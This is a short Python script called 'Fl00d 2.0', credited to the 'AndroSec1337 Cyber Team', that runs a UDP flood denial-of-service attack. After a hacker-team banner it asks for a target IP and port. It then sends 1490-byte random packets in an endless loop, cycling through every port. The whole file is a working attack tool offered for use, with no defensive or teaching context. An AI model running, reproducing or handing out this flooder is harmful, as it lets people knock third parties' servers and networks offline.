#!/system/bin/python
#Fl00d 2.0 27-06-2017 (1:42)
#Tool for UDP Flood
#Authorized by DedSecTL
#AndroSec1337 Cyber Team
import socket, os, random, time

# Color
B = '\033[1m'
R = '\033[31m'
N = '\033[0m'

# Code time ##################
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
##############################

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
os.system("clear")
print B+"《《《《《Rycoder 》》》》》"
print "     《《《《Cyber-D 》》》》》》"
print "《《《《《Instagram  Rycoder_1 》》》》》》》"
print "《《《《《Youtube  Rycoder_1 》》》》》》》"
print "♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡"
print "Gray Hat Hacker "
print "__________________________________"
print ":!:      :!:     :!:    !:! :!:    !:! :!:     !:!"
print ":::      ::::::: :::::::::: :::::::::: ;::    :::"
print ":::      :::::::  ::::::::   ::::::::  :::::::::"+N
print "["+B+""+R+"#"+N+"] "+B+""+R+"AndroSec1337 Cyber-D Team"+N+"   Fl00d 2.0 - "+B+""+R+"DedSecTL"+N
print
print "Hacker Rycoder"
print "Cyber-D Team"
print
ip = raw_input('[$] T@rget 1P: ')
port = input('[$] P0rt: ')
os.system("clear")
print "Fl00d attack started on {0}.{1} | {2}-{3}-{4}".format(hour, minute, day, month, year)
time.sleep(3)
print
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1